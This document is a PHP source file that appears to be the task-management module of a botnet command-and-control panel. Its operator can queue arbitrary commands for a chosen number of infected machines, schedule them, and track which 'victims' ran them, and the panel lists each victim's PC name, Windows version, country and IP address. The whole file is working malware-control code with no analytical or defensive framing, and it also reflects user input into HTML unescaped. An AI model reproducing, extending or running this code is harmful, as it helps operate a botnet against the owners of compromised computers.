<?php

class BOTI_func_tasks {
	var $content;
	function run() {
		global $_BOTI;
		if(isset($_GET['new'])) $this->new_task();
		elseif(isset($_GET['delete'])) $this->delete_task(intval($_GET['id'])).$this->list2();
		elseif(intval($_GET['id'])) $this->show_id(intval($_GET['id']));
		else $this->list2();

		$this->content .= title("Commands");
		foreach($_BOTI->commands as $command=>$desc) $this->content .= content('<b>'.$command.'</b> - '.$desc);
	}
	function delete_task($id) {
		global $_BOTI;
		$_BOTI->query("DELETE FROM BOTI_tasks WHERE taskID='".$id."'");
		$_BOTI->query("DELETE FROM BOTI_task_done WHERE taskID='".$id."'");
		$_BOTI->query("UPDATE BOTI_victims SET taskID=0 WHERE taskID='".$id."'");
		$this->content .= content("Task successfully deleted!", "success");
	}
	function new_task() {
		global $_BOTI;
		$this->content .= title("New Task");
		if($_POST['submit']) {
			if($_POST['start']) {
				list($date, $time) = explode(' ', trim($_POST['start']));
				$date = explode('.', $date);
				$time = explode(':', $time);
				$starttime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
			} else $starttime = false;
			if($_POST['end']) {
				list($date, $time) = explode(' ', trim($_POST['end']));
				$date = explode('.', $date);
				$time = explode(':', $time);
				$endtime = @mktime($time[0], $time[1], 0, $date[1], $date[0], $date[2]);
			} else $endtime = false;
			if(!trim($_POST['command'])) $this->content .= content("<b>Error:</b><br />Command is not specified!", "error");
			elseif(trim($_POST['start']) != date("d.m.Y H:i", $starttime)) $this->content .= content("<b>Error:</b><br />Invalid start time!", "error");
			elseif(intval($_POST['bots']) <= 0)  $this->content .= content("<b>Error:</b><br />Invalid number of bots or not specified!", "error");
			elseif($_POST['type'] != "once" && $_POST['type'] != "until")  $this->content .= content("<b>Error:</b><br />Type of task is not specified!", "error");
			elseif($_POST['type'] == "until" && trim($_POST['end']) != date("d.m.Y H:i", $endtime)) $this->content .= content("<b>Error:</b><br />Invalid end time!", "error");
			else {
				$_BOTI->query("INSERT INTO BOTI_tasks (`time`, `elapsed`, `command`, `bots`) VALUES ('".$starttime."', '".($_POST['type'] == "until" ? $endtime : 0)."', '".mysql_escape_string($_POST['command'])."', '".intval($_POST['bots'])."')");
				$this->content .= content("Task successfully created!", "success");
				$this->content .= $this->show_id(mysql_insert_id());
				return 1;
			}
		}
		$table = '<form method="post" action="?action=tasks&new"><table>';
		$table .= '<tr><td style="text-align:right">Command:</td><td><input type="text" name="command" value="'.$_POST['command'].'"/></td></tr>';
		$table .= '<tr><td style="text-align:right;">Start Time:</td><td><input type="text" name="start" value="'.($_POST['start'] ? $_POST['start'] : date("d.m.Y H:i")).'"></td></tr>';
		$table .= '<tr><td style="text-align:right;">Number of Bots:</td><td><input type="text" name="bots" value="'.$_POST['bots'].'"/></td></tr>';
		$table .= '<tr><td>&nbsp;</td><td><input type="radio" value="once" name="type"'.($_POST['type'] == "once" ? ' checked="checked"' : '').'/> Run Once <input type="radio" value="until" name="type"'.($_POST['type'] == "until" ? ' checked="checked"' : '').'/> Run Until</td></tr>';
		$table .= '<tr><td style="text-align:right;">End Time:</td><td><input type="text" name="end" value="'.($_POST['end'] ? $_POST['end'] : date("d.m.Y H:i")).'"></td></tr>';
		$table .= '<tr><td>&nbsp;</td><td style="text-align:right;padding-right:20px"><input type="submit" value="Create Task" name="submit" /></td></tr>';		
		$table .= '</table></form>';
		$this->content .= content($table);

	}
	function show_id($id) {
		global $_BOTI;
		$query = $_BOTI->query("SELECT t.*,(SELECT count(*) FROM BOTI_victims WHERE taskID=t.taskID) AS vics,(SELECT count(*) FROM BOTI_task_done WHERE taskID=t.taskID) AS done FROM BOTI_tasks AS t WHERE t.taskID='".$id."'");
		$ds=mysql_fetch_array($query);
		$this->content .= title("Details");

		$table = '<table>';
	
		$table .= '<tr><td style="text-align:right;width:40%">Task ID:</td><td><b>'.$ds['taskID'].'</b></td></tr>';
		$table .= '<tr><td style="text-align:right;">Command:</td><td><b>'.$ds['command'].'</b></td></tr>';
		$table .= '<tr><td style="text-align:right;">Start Time:</td><td>'.date("d.m.Y H:i", $ds['time']).'</td></tr>';
		if($ds['elapsed']) $table .= '<tr><td style="text-align:right;">End Time:</td><td>'.date("d.m.Y H:i", $ds['elapsed']).'</td></tr>';
		$table .= '<tr><td style="text-align:right;">Number of Bots:</td><td>'.$ds['bots'].' Bots</td></tr>';
		if(!$ds['elapsed']) $table .= '<tr><td style="text-align:right;">Done by:</td><td>'.$ds['done'].' Bots</td></tr>';
		$table .= '</table><div style="text-align:right;padding:10px"><a href="?action=tasks&delete&id='.$ds['taskID'].'" onclick="return confirm(\'Do you really want to delete this Task?\')" class="button"><span>Delete Task</span></a></div>';
		$this->content .= content($table);
		if($ds['elapsed']) 	{
			$query = $_BOTI->query("SELECT * FROM BOTI_victims WHERE taskID='".$id."' AND ConTime >".(time()-$_BOTI->online));
			if(!mysql_num_rows($query)) return false;
			$this->content .= title("Current Bots (".mysql_num_rows($query).")");
		} else {

			$query = $_BOTI->query("SELECT v.* FROM BOTI_task_done AS d LEFT JOIN BOTI_victims AS v ON (v.ID=vicID) WHERE d.taskID='".$id."'");
			if(!mysql_num_rows($query)) return false;
			$this->content .= title("Done by the following Bots (".mysql_num_rows($query).")");
		}
		

		$table = '<table><tr class="tr_title">
		<td style="width:20px">&nbsp;</td>
		<td style="width:20px">&nbsp;</td>
		<td>Name</td>
		<td>Operating System</td>
		<td>Version</td>
		<td>Install Date</td>
		<td>IP</td>
	</tr>';
	
		while($ds=mysql_fetch_array($query)) {
			$status = ($ds['ConTime'] > time()-$_BOTI->online ? ($ds['taskID'] ? '<a href="?action=tasks&id='.$ds['taskID'].'" class="green">'.$ds['command'].'</a>' : '<span class="green">Online</span>') : '<span class="red">Offline</span>');
			$table .= '<tr><td>#'.$ds['ID'].'</td><td><img src="images/lang/'.strtolower($ds['Country']).'.gif" alt="DE"/></td><td>'.$ds['PCName'].'</td><td>'.$ds['WinVersion'].'</td><td>'.$ds['BotVersion'].'</td><td>'.date("d.m.Y", $ds['InstTime']).'</td><td>'.$ds['IP'].'</td></tr>';

		}
		$table .= '</table>';
		$this->content .= content($table);
	}
	function list2() {
		global $_BOTI;
		$query = $_BOTI->query("SELECT t.*,(SELECT count(*) FROM BOTI_victims WHERE taskID=t.taskID) AS vics,(SELECT count(*) FROM BOTI_task_done WHERE taskID=t.taskID) AS done FROM BOTI_tasks AS t WHERE t.time <= '".time()."' AND (t.elapsed > '".time()."' OR (t.elapsed=0 AND (SELECT count(*) FROM BOTI_task_done WHERE taskID=t.taskID)<bots))");

		$this->content .= title("Current Tasks (".mysql_num_rows($query).")");

		$table = '<table><tr class="tr_title">
		<td style="width:20px">&nbsp;</td>
		<td>Command</td>
		<td>Start Time</td>
		<td>Run Until</td>
		<td>Bots</td>
	</tr>';
	
		while($ds=mysql_fetch_array($query)) {
			$table .= '<tr><td>#'.$ds['taskID'].'</td><td><a href="?action=tasks&id='.$ds['taskID'].'"><b>'.$ds['command'].'</b></a></td><td>'.date("d.m.Y H:i", $ds['time']).'</td><td>'.($ds['elapsed'] > 0 ? date("d.m.Y H:i", $ds['elapsed']) : '&nbsp;').'</td><td>'.($ds['elapsed'] == 0 ? $ds['done'].'/' : '').$ds['bots'].'</td></tr>';
		}
		$table .= '</table><div style="text-align:right;padding:10px"><a href="?action=tasks&new" class="button"><span>New Task</span></a></div>';
		$this->content .= content($table);

		$query = $_BOTI->query("SELECT t.*,(SELECT count(*) FROM BOTI_victims WHERE taskID=t.taskID) AS vics,(SELECT count(*) FROM BOTI_task_done WHERE taskID=t.taskID) AS done FROM BOTI_tasks AS t WHERE t.time > '".time()."' OR (t.elapsed < '".time()."' AND t.elapsed != 0) OR (t.elapsed=0 AND (SELECT count(*) FROM BOTI_task_done WHERE taskID=t.taskID)>=bots)");

		if(!mysql_num_rows($query)) return 1;
		$this->content .= title("Future/Done Tasks (".mysql_num_rows($query).")");

		$table = '<table><tr class="tr_title">
		<td style="width:20px">&nbsp;</td>
		<td>Command</td>
		<td>Start Time</td>
		<td>Run Until</td>
		<td>Bots</td>
	</tr>';
	
		while($ds=mysql_fetch_array($query)) {
			$table .= '<tr><td>#'.$ds['taskID'].'</td><td><a href="?action=tasks&id='.$ds['taskID'].'"><b>'.$ds['command'].'</b></a></td><td>'.date("d.m.Y H:i", $ds['time']).'</td><td>'.($ds['elapsed'] > 0 ? date("d.m.Y H:i", $ds['elapsed']) : '&nbsp;').'</td><td>'.($ds['elapsed'] == 0 ? $ds['done'].'/' : '').$ds['bots'].'</td></tr>';
		}
		$table .= '</table>';
		$this->content .= content($table);
	}

}


?>